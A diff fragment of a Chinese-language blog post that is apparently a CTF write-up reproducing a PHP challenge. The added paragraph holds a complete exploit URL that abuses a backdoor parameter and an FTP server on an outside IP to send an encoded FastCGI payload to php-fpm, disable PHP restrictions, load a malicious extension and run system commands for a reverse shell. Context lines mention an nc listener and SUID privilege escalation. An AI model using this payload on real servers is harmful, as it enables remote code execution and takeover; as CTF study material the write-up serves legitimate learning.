@@ -1051,6 +1051,7 @@ conn.send(b&#39;221 Goodbye.\n&#39;)
 conn.close()
 </code></pre>
 <p>再在vps用nc起个监听用来接收反弹shell <code>nc -lvp 2333</code></p>
+<p>访问<code>?backdoor=$file%20=%20$_GET[%27file%27];$data%20=%20$_GET[%27data%27];file_put_contents($file,$data);&amp;file=ftp://aaa@106.15.74.181:23/123&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9000%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</code>即可触发php-fpm ssrf弹shell</p>
 <p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20210523052953633.png" alt="image-20210523052953633"></p>
 <p>可以看到还是没权限去读，那么接下来就要用到题目hint给出的suid提权。</p>
 <p>执行</p>
